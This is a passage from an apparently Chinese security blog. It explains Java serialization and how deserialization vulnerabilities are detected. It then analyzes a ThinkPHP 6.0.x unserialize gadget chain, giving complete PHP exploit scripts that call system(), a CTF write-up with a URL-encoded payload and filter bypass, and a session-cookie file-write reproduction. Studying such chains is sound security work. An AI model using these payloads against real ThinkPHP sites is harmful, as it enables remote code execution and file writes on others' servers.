class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tq;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyJavaSerialize</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">UInfo</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String userName;</span><br><span class="line">        <span class="keyword">private</span>  <span class="keyword">int</span> userAge;</span><br><span class="line">        <span class="keyword">private</span>  String userAddress;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getUserName</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> userName;&#125;;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getUserAge</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> userAge;&#125;;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getUserAddress</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> userAddress;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserName</span><span class="params">(String userName)</span></span>&#123;<span class="keyword">this</span>.userName=userName;&#125;;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserAge</span><span class="params">(<span class="keyword">int</span> userAge)</span></span>&#123;<span class="keyword">this</span>.userAge=userAge;&#125;;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserAddress</span><span class="params">(String userAddress)</span></span>&#123;<span class="keyword">this</span>.userAddress=userAddress;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        UInfo userInfo=<span class="keyword">new</span> UInfo();</span><br><span class="line">        userInfo.setUserAddress(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        userInfo.setUserAge(<span class="number">22</span>);</span><br><span class="line">        userInfo.setUserName(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line"></span><br><span class="line">        OutputStream outputStream=<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;serial&quot;</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream=<span class="keyword">new</span> ObjectOutputStream(outputStream);</span><br><span class="line">        objectOutputStream.writeObject(userInfo);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        InputStream inputStream=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;serial&quot;</span>);</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> ObjectInputStream(inputStream);</span><br><span class="line">        UInfo unserialUInfo=(UInfo) objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        inputStream.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(unserialUInfo.userName);</span><br><span class="line">        System.out.println(unserialUInfo.userAge);</span><br><span class="line">        System.out.println(unserialUInfo.userAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果，工程目录下会生成一个serial文件，其内容就是序列化后的数据</p><p><img src="https://www.hualigs.cn/image/6073d5c5e3da5.jpg"></p><h2 id="Externalizable接口"><a href="#Externalizable接口" class="headerlink" title="Externalizable接口"></a>Externalizable接口</h2><p>除了Serializable接口，java还提供了另一个序列化接口Externalizable，该接口继承自Serializable接口，但是有两个抽象函数：writeExternal和readExternal。需要自行实现两个函数来控制序列化流程，否则目标序列化类属性值会是类初始化后的默认值。</p><p>在使用Externalizable接口实现序列化时，读取对象会调用目标序列化类的无参构造函数去创建一个新的对象，再把徐磊话数据中的类属性值分别填充到新对象中。所以实现Externalizable接口的类必须提供一个public属性的无参构造函数</p><h2 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="serialVersionUID"></a>serialVersionUID</h2><p>目标序列化类有一个隐藏属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private static final long serialVerionUID</span><br></pre></td></tr></table></figure><p>Java虚拟机判断是否允许序列化数据被序列化时，会取决于两个类的serialVersionUID是否一致。serialVerionUID在不同编译器内可能有不同的值，开发者可以在目标序列化类中提供固定值。在提高serialVerionUID固定值的情况下，只要序列化数据中国的serialVerionUID和目标序列化类中的一致就可以成功反序列化。如果没有指定值，编译器会根据class文件内容通过一定算法生成值，在不同环境下，编译器得到的serialVerionUID值不同，就会导致反序列化失败。改变目标类中代码也可能会影响生成的serialVersionUID，此时会抛出java.io.InvalidClassException并指出serialVersionUID不一致。建议在目标序列化类中显示定义serialVersionUID并赋予明确的值。</p><p>显示定义serialVersionUID有两种用途：</p><p>1.在某些场合，希望类的不同版本兼容序列化，所以需要确保类的不同版本有相同的serialVersionUID</p><p>2.某些时候不希望类的不同版本对序列化有兼容，所以需要类的不同版本有不同的serialVerionUID</p><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>java有多种序列化和反序列化工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JDK自带的Serializable</span><br><span class="line">fastjson和jackson是JSON的知名反序列化工具</span><br><span class="line">xmldecoder和xstream是XML的知名反序列化工具</span><br></pre></td></tr></table></figure><p>java拥有完善的第三方类库和满足各种需求的框架，但因为很多第三方类库引用广泛，如果其中某些组件出现安全问题，那么受影响范围将极为广泛。</p><h2 id="漏洞入口"><a href="#漏洞入口" class="headerlink" title="漏洞入口"></a>漏洞入口</h2><p>ObjectInputStream对象的readObject函数调用是java反序列化流程的入口，序列化数据的来源包括：Cookie、GET参数、POST参数或者流、HTTP Head或者来自用户可控内容的数据库等。</p><p>触发场景：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.HTTP请求中的参数</span><br><span class="line">2.RMI，即Java远程方法调用，在RMI中传输的数据皆为序列化</span><br><span class="line">3.JMX，一个为应用程序植入管理功能的框架</span><br><span class="line">4.自定义协议 用来接收与发送原始的java对象</span><br></pre></td></tr></table></figure><p>反序列化相关函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br></pre></td></tr></table></figure><h2 id="数据特征"><a href="#数据特征" class="headerlink" title="数据特征"></a>数据特征</h2><p>序列化的数据头是不变的，传输过程中可能会对字节流进行编码，解码后查看字节流开头，反序列化数据开头包含两字节的魔术数字，后面是两字节的版本号，如<code>ac ed 00 05</code>，而经过Base64编码过序列化数据的字节流头部为<code>Ro0AB</code>，在攻击检测时可针对该特征进行匹配请求post中是否包含反序列化数据，判断是否为反序列化漏洞攻击。</p><h2 id="利用形式"><a href="#利用形式" class="headerlink" title="利用形式"></a>利用形式</h2><p>JDK原生反序列化工具Serializable大致有两种利用形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.完整对象前的利用</span><br><span class="line">在JDK对恶意序列化数据进行反序列化的过程中达成攻击效果，这种利用方式大多基于对java开发中频繁调用函数的理解，寻找漏洞触发点。例如commons-collections3.1反序列化漏洞利用中的rce gadget属于以readObject函数调用点为入口，直接在依赖包中寻找到rce的利用方式</span><br><span class="line"></span><br><span class="line">2.生成完整对象的利用</span><br><span class="line">如身份令牌反序列化，要等待对象反序列化完成后，利用其中的函数或者属性值完成攻击</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Thinkphp6.0.x反序列化</title>
    <link href="/2021/04/11/Thinkphp6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2021/04/11/Thinkphp6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">think\Model --&gt; __destruct()</span><br><span class="line">think\Model --&gt; save()</span><br><span class="line">think\Model --&gt; updateData()</span><br><span class="line">think\Model --&gt; checkAllowFields()</span><br><span class="line">think\Model --&gt; db()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">后半部分利用链（同tp 5.2后半部分利用链)</span><br><span class="line"></span><br><span class="line">think\model\concern\Conversion --&gt; __toString()</span><br><span class="line">think\model\concern\Conversion --&gt; __toJson()</span><br><span class="line">think\model\concern\Conversion --&gt; __toArray()</span><br><span class="line">think\model\concern\Attribute --&gt; getAttr()</span><br><span class="line">think\model\concern\Attribute --&gt; getValue()</span><br></pre></td></tr></table></figure><p>vendor/topthink/think-orm/src/Model.php</p><p>Model类中存在<code>__destruct()</code>方法，令<code>$this-&gt;lazySave</code>等于true，调用<code>save()</code>。Model类为抽象类，利用的时候要用它的子类Pivot</p><p><img src="https://ae01.alicdn.com/kf/Udb251c41e330455b8fb5097af7b8f1f4l.jpg"></p><p>跟进<code>save()</code>函数，触发点位于updateData函数内，首先需要构造参数防止函数直接返回，才能进入updateData()函数</p><p><img src="https://ae01.alicdn.com/kf/U7b22f6dd27c7476cb941ac9835abf8c2c.jpg"></p><p>需要满足三个条件才能进入<code>updateData()</code>，</p><p>1.<code>$this-&gt;exists</code>为true</p><p>2.<code>isEmpty()</code>需要返回false，给<code>$this-&gt;data</code>赋值即可</p><p><img src="https://ae01.alicdn.com/kf/Ufc13f37c25054146a92fd6bc978387cfY.jpg"></p><p>3.<code>trigger()</code>需要返回true，让<code>$this-&gt;withEvent</code>等于false</p><p><img src="https://ae01.alicdn.com/kf/U519975bafe3b4ba39b3d4485b2e2558by.jpg"></p><p><code>checkAllowFields()</code>触发<code>__toString()</code>，需要构造参数防止提前return，第一个if条件已经满足。第二个if，需要<code>empty($data)</code>等于false<img src="https://ae01.alicdn.com/kf/U6cfffa14ceb744c9aa721e51c943b08fV.jpg"></p><p>/vendor/topthink/think-orm/src/model/concern/Attribute.php</p><p>跟进getChangeData()方法，让<code>$this-&gt;force</code>和<code>$this-&gt;data</code>都有值就可以</p><p><img src="https://ae01.alicdn.com/kf/U8068fa04022e47df9b42d86110a778a8F.jpg"></p><p>需要先满足<code>$this-&gt;field</code>为空、<code>$this-&gt;schema</code>为空两个条件才能调用<code>$this-&gt;db()</code></p><p><img src="https://ae01.alicdn.com/kf/U2d23332ec7634727b78b56ec0be104b0q.jpg"></p><p><code>db()</code>方法中出现了拼接字符串操作，触发<code>__toString()</code>，需要先让<code>$this-&gt;connection</code>等于mysql</p><p><img src="https://ae01.alicdn.com/kf/U703843abe7084b8291c72699885cb84eC.jpg"></p><p>接下来就是原来tp5的<code>__toString</code>利用链，由于model\concern\Conversion是一个trait复用类，所以只要在Model下use即可</p><p>vendor/topthink/think-orm/src/model/concern/Conversion.php</p><p>存在<code>__toString()</code>方法，调用<code>toJson()</code></p><p><img src="https://ae01.alicdn.com/kf/Ude5942d7801b4bb2a2511f1eca911eb1N.jpg"></p><p>跟进<code>toJson()</code>，调用<code>__toArray()</code></p><p><img src="https://ae01.alicdn.com/kf/U01245cd69e9d40ae8b3d8675f4f51d81N.jpg"></p><p><code>toArray()</code></p><p><img src="https://ae01.alicdn.com/kf/U35601ce018cf4d2bafde20e70dff77a7o.jpg"><img src="https://ae01.alicdn.com/kf/U9c2f1cb03dc24b74bfe0ad667bb02a02H.jpg"></p><p>vendor/topthink/think-orm/src/model/concern/Attribute.php</p><p><code>getAttr()</code>函数，调用getValue()</p><p><img src="https://ae01.alicdn.com/kf/U2fe78f342e7542df97e2b458ea4b8b32s.jpg"></p><p><code>getData()</code></p><p><img src="https://ae01.alicdn.com/kf/Uc4fadcd1d5fe4c539aa5c52b035fb353I.jpg"></p><p><code>getRealFieldName()</code>，<code>$this-&gt;strict</code>等于true返回<code>$name</code>，这样<code>getData()</code>方法就会返回<code>$this-&gt;data[$name]</code>。</p><p><img src="https://ae01.alicdn.com/kf/U75a107b89387416ea707f9c7aa7f978dJ.jpg"></p><p><code>getValue()</code>函数中存在命令执行，当<code>$this-&gt;withAttr[$fieldName]</code>不为数组的时候触发。</p><p><img src="https://ae01.alicdn.com/kf/U2ccdaddc20c3418b9ad6e7aabf3667fc1.jpg"></p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Attribute</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">data</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&quot;xxx&quot;</span> =&gt; <span class="string">&quot;system&quot;</span>];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;xxx&quot;</span> =&gt; <span class="string">&quot;whoami&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$force</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$field</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$schema</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;force = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;schema = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">//定义this-&gt;data不为空</span></span><br><span class="line">            <span class="built_in">parent</span>::__construct();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> Pivot();</span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> Pivot(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地测试</p><p><img src="https://ae01.alicdn.com/kf/U6147714709d54a8287f0eab71c70632cc.jpg"></p><h1 id="安洵杯-2019-iamthinking"><a href="#安洵杯-2019-iamthinking" class="headerlink" title="[安洵杯 2019]iamthinking"></a>[安洵杯 2019]iamthinking</h1><p>存在备份文件<a href="http://www.zip/">www.zip</a></p><p><img src="https://ae01.alicdn.com/kf/U9820749315214de0b56df1fdfcfd1972t.jpg"></p><p>查看源码得到版本为thinkphp6，查看控制器，发现存在unserialize。过滤了O开头的字符串，可以根据parse_url的特性绕过，在解析形如<code>http://xxx.com///index.php?payload=cmd</code>这样的URI时parse_url会返回false。</p><p><img src="https://ae01.alicdn.com/kf/Ubde65ecd0f4c479f965c9d61ce9abe8fC.jpg"></p><p>在解析形如<code>http://xxx.com///index.php?payload=cmd</code>这样的URI时parse_url会返回false</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Attribute</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">data</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&quot;xxx&quot;</span> =&gt; <span class="string">&quot;system&quot;</span>];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;xxx&quot;</span> =&gt; <span class="string">&quot;cat /flag&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$force</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$field</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$schema</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;force = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;schema = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">//定义this-&gt;data不为空</span></span><br><span class="line">            <span class="built_in">parent</span>::__construct();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> Pivot();</span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> Pivot(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用反序列化漏洞，得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;c9c7cb46-f78b-4359-a3b6-7cfc292d6693.node3.buuoj.cn&#x2F;&#x2F;&#x2F;public&#x2F;?payload&#x3D;O%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00field%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00schema%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00field%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00schema%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A6%3A%22system%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/Ua4b2ba8f1083450a97da5f44101cc09d5.jpg"></p><p>参考</p><p><a href="https://www.cnblogs.com/20175211lyz/p/12203047.html">https://www.cnblogs.com/20175211lyz/p/12203047.html</a></p><p><a href="https://forum.90sec.com/t/topic/1160">https://forum.90sec.com/t/topic/1160</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Thinkphp6.0.0-6.0.1 任意文件操作漏洞复现</title>
    <link href="/2021/04/10/Thinkphp6-0-0-6-0-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/04/10/Thinkphp6-0-0-6-0-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>thinkphp6默认是没有开启session功能的,需要取消app\middleware.php文件中对session的注释</p><p><img src="https://i.loli.net/2021/04/10/OPnASFNwt2DaoKf.png" alt="image-20210410120046743.png"></p><p>由于默认情况下没有创建session，所需要修改一下控制器，加上创建session的功能。</p><p><img src="https://www.hualigs.cn/image/607146a875416.jpg"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>修改cookie为<code>PHPSESSID=aaaabbbbccccddddeeeeffff1234.php</code>，文件名长度必须等于32位</p><p><img src="https://i.loli.net/2021/04/10/rAE1VqHf87vWnNK.png" alt="image-20210410121629403.png"></p><p>写入成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tp6.0.0&#x2F;runtime&#x2F;session&#x2F;sess_aaaabbbbccccddddeeeeffff1234.php</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607146af4dd4b.jpg"></p><p>写入文件内容</p><p><img src="https://www.hualigs.cn/image/607146a5efef4.jpg"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="任意文件写入"><a href="#任意文件写入" 